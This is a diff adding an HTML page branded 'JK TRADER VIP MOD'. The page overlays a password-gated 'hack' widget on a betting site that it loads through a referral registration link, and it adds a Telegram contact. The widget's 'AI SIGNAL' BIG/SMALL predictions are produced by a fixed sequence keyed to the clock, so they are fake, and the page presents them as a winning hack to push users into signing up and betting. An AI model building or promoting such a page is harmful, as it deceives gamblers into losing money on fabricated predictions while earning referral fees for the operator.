@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>JK TRADER VIP MOD</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+
+<style>
+:root {
+--glow-cyan:#00f7ff; --glow-gold:#ffcc00; --glow-violet:#bc13fe;
+--glow-green:#00ff66; --glow-red:#ff003c;
+}
+
+body,html{
+margin:0;padding:0;height:100%;overflow:hidden;
+background:#000;font-family:'Orbitron',sans-serif;
+display:flex;justify-content:center;align-items:center;
+}
+
+#game-frame{
+position:absolute;top:0;left:0;width:100%;height:100%;
+border:none;z-index:1;
+}
+
+.circular-hack{
+position:relative;width:185px;height:185px;
+z-index:1000;display:flex;justify-content:center;align-items:center;
+touch-action:none;
+}
+
+/* Top Buttons */
+.top-btn{
+position:absolute;width:32px;height:32px;border-radius:50%;
+border:1.5px solid var(--glow-gold);
+background:#000;z-index:1001;overflow:hidden;
+display:flex;justify-content:center;align-items:center;
+box-shadow:0 0 8px var(--glow-gold);
+}
+
+.btn-left{top:-5px;left:5px;}
+.btn-right{
+top:-5px;right:5px;
+border-color:#0088cc;
+box-shadow:0 0 8px #0088cc;
+}
+
+.btn-left img{width:100%;height:100%;object-fit:cover;}
+
+/* Orbits */
+.orbit{position:absolute;border-radius:50%;border:1.2px solid transparent;}
+.orbit-1{width:95px;height:95px;border-color:var(--glow-cyan);}
+.orbit-2{width:135px;height:135px;border:1px dashed var(--glow-gold);animation:rotate 15s linear infinite;}
+.orbit-3{width:175px;height:175px;border-color:var(--glow-violet);opacity:0.4;}
+
+@keyframes rotate{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+
+/* Balls */
+.ball{position:absolute;border-radius:50%;border:1.2px solid #fff;box-shadow:0 0 4px #fff;}
+.b1{width:10px;height:10px;background:var(--glow-gold);animation:orb_s 4s linear infinite;}
+.b2{width:10px;height:10px;background:var(--glow-violet);animation:orb_s 7s linear infinite reverse;}
+.b3{width:10px;height:10px;background:var(--glow-cyan);animation:orb_s 5s linear infinite;}
+.b4{width:10px;height:10px;background:var(--glow-green);animation:orb_s 6s linear infinite reverse;}
+.bf1{width:7px;height:7px;background:var(--glow-red);animation:orb_f_in 2s linear infinite;}
+.bf2{width:7px;height:7px;background:var(--glow-cyan);animation:orb_f_out 2.5s linear infinite reverse;}
+.bf3{width:7px;height:7px;background:var(--glow-gold);animation:orb_f_out 3.5s linear infinite;}
+
+@keyframes orb_s{from{transform:rotate(0deg) translateX(67px) rotate(0deg);}to{transform:rotate(360deg) translateX(67px) rotate(-360deg);}}
+@keyframes orb_f_in{from{transform:rotate(0deg) translateX(47px) rotate(0deg);}to{transform:rotate(360deg) translateX(47px) rotate(-360deg);}}
+@keyframes orb_f_out{from{transform:rotate(0deg) translateX(87px) rotate(0deg);}to{transform:rotate(360deg) translateX(87px) rotate(-360deg);}}
+
+/* Center */
+.center-box{
+position:relative;width:85px;height:85px;
+background:rgba(0,0,0,0.95);
+border-radius:50%;
+display:flex;flex-direction:column;justify-content:center;
+align-items:center;text-align:center;
+border:1px solid rgba(255,255,255,0.1);
+}
+
+#login-view{display:flex;flex-direction:column;align-items:center;}
+.login-name{font-size:7px;font-weight:900;color:var(--glow-gold);margin-bottom:4px;}
+
+#passInput{
+width:60px;padding:3px;background:#111;border:1px solid var(--glow-cyan);
+color:#fff;text-align:center;font-size:9px;font-family:'Orbitron';
+outline:none;border-radius:3px;
+}
+
+#loginBtn{
+margin-top:4px;padding:3px 8px;
+background:var(--glow-gold);
+border:none;font-weight:900;font-size:7px;
+cursor:pointer;border-radius:2px;
+font-family:'Orbitron';
+}
+
+#hack-view{display:none;flex-direction:column;align-items:center;}
+.brand{font-size:7px;font-weight:900;color:var(--glow-gold);}
+.p-id{font-size:7px;color:var(--glow-cyan);}
+.timer{font-size:24px;font-weight:900;color:var(--glow-green);}
+.res-text{font-size:11px;font-weight:900;text-transform:uppercase;}
+.accuracy-tag{font-size:6px;color:var(--glow-green);}
+</style>
+</head>
+
+<body>
+
+<iframe id="game-frame" src="https://0bdwin24.com/register?inviteCode=DA4RUNN&from=web"></iframe>
+
+<div class="circular-hack" id="dragBox">
+
+<div class="top-btn btn-left">
+<img src="https://ik.imagekit.io/tsa2ivx6b/images%20(7).jpeg">
+</div>
+
+<div class="top-btn btn-right">
+<a href="https://t.me/RTxTADAR69" target="_blank">
+<svg viewBox="0 0 24 24" width="18" height="18" fill="#0088cc">
+<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
+</svg>
+</a>
+</div>
+
+<div class="orbit orbit-3"></div>
+<div class="orbit orbit-2"></div>
+<div class="orbit orbit-1"></div>
+
+<div class="ball b1"></div>
+<div class="ball b2"></div>
+<div class="ball b3"></div>
+<div class="ball b4"></div>
+<div class="ball bf1"></div>
+<div class="ball bf2"></div>
+<div class="ball bf3"></div>
+
+<div class="center-box">
+<div id="login-view">
+<div class="login-name">Jk TRADER</div>
+<input type="password" id="passInput" placeholder="PASS">
+<button id="loginBtn" onclick="handleLogin()">LOGIN</button>
+</div>
+
+<div id="hack-view">
+<div class="brand">Jk TRADER</div>
+<div class="p-id">#<span id="period">000</span></div>
+<div class="timer" id="timer">00</div>
+<div id="res" class="res-text">ANALYZING</div>
+<div class="accuracy-tag">AI SIGNAL</div>
+</div>
+</div>
+</div>
+
+<script>
+function handleLogin(){
+if(document.getElementById('passInput').value==="EMRAN#69"){
+document.getElementById('login-view').style.display='none';
+document.getElementById('hack-view').style.display='flex';
+startEngine();
+}else{alert("WRONG PASS!");}
+}
+
+let isReady=false;
+let lastResult="";
+
+function startEngine(){
+function update(){
+const now=new Date();
+const sec=now.getUTCSeconds();
+let sync=29-(sec%30);
+
+document.getElementById('timer').innerText=sync<10?"0"+sync:sync;
+
+const pid=Math.floor(((now.getUTCHours()*60)+now.getUTCMinutes())*2)+(sec>=30?1:0)+1;
+document.getElementById('period').innerText=String(pid).slice(-3);
+
+if(sync<=2 || sync>=28){
+document.getElementById('res').innerText="WAITING...";
+document.getElementById('res').style.color="var(--glow-cyan)";
+isReady=false;
+}else if(!isReady){
+
+const sequence=["BIG","BIG","SMALL","BIG","SMALL","SMALL","BIG","SMALL","BIG","BIG"];
+let result=sequence[pid%10];
+
+if(pid%4===0){
+result=(lastResult==="BIG")?"SMALL":"BIG";
+}
+
+document.getElementById('res').innerText=result;
+document.getElementById('res').style.color=result==="BIG"?"var(--glow-gold)":"#fff";
+lastResult=result;
+isReady=true;
+}
+
+requestAnimationFrame(update);
+}
+update();
+}
+
+/* Drag Fix */
+const box=document.getElementById('dragBox');
+let offX=0,offY=0,isDown=false;
+
+box.addEventListener('touchstart',(e)=>{
+if(e.target.id==="passInput" || e.target.id==="loginBtn")return;
+isDown=true;
+offX=e.touches[0].clientX-box.offsetLeft;
+offY=e.touches[0].clientY-box.offsetTop;
+});
+
+document.addEventListener('touchend',()=>isDown=false);
+
+document.addEventListener('touchmove',(e)=>{
+if(!isDown)return;
+box.style.position='fixed';
+box.style.left=(e.touches[0].clientX-offX)+'px';
+box.style.top=(e.touches[0].clientY-offY)+'px';
+});
+</script>
+
+</body>
+</html>
